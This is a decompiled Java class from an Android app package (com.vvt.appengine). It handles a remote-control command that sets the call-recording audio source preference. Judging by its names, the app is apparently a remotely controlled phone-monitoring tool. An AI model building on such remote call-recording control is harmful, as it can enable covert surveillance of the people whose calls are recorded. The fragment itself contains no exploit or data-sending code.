package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefCallRecordingAudioSource;
import com.vvt.preference.b;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;

public class bl
{
  private static final boolean a = a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    b localb = paramh.n;
    Object localObject1 = FxPreferenceType.CALL_RECORDING_AUDIO_SOURCE;
    localObject1 = (PrefCallRecordingAudioSource)localb.a((FxPreferenceType)localObject1);
    Object localObject2 = paramControlCommand.getData();
    boolean bool2 = localObject2 instanceof RmtCtrlInputCallRecordingAudioSource;
    if (bool2)
    {
      localObject2 = ((RmtCtrlInputCallRecordingAudioSource)localObject2).getAudioSource();
      int i = ((RmtCtrlInputCallRecordingAudioSource.AudioSource)localObject2).getId();
      bool2 = a;
      if (bool2) {}
      ((PrefCallRecordingAudioSource)localObject1).setAudioSource(i);
      localb.b();
      bool1 = a;
      if (!bool1) {}
    }
    bool1 = a;
    if (bool1) {}
    return true;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bl.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */